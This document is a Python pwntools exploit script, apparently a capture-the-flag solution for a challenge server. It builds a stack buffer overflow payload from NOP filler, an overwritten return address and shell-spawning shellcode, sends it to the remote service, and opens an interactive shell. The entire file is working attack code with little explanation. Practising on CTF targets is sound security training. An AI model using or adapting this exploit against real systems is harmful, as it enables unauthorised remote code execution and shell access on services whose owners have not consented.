#!/usr/bin/env python3
import shutil, os, sys

import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13448

context.update(arch= 'amd64', os='linux')

def make_payload():
    #get assembly to open a shell
    shellcode = shellcraft.sh()
    

    #assemble it into bytes
    shellcode_b = asm(shellcode)

    print("Shellcode bytes lenght: " + str(len(shellcode_b)))

    offset = 32 + 8   #buffer + rbp = 40 bytes, after that there is ret address
    buff_addr = 0x7fffffffdca0
    ret_addr = buff_addr + 40
    #print(hex(buff_addr))

    nop_bytes = asm('nop')        # assemble a nop for amd64
    #print(nop_bytes)              # b'\x90'

    filler = nop_bytes*(offset)


    payload = filler + ret_addr.to_bytes(8,'little') + shellcode_b

    #print(payload)

    return payload

def main():

    server = remote(HOST, PORT)

    g = server.recvuntil(b'Please enter your name: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
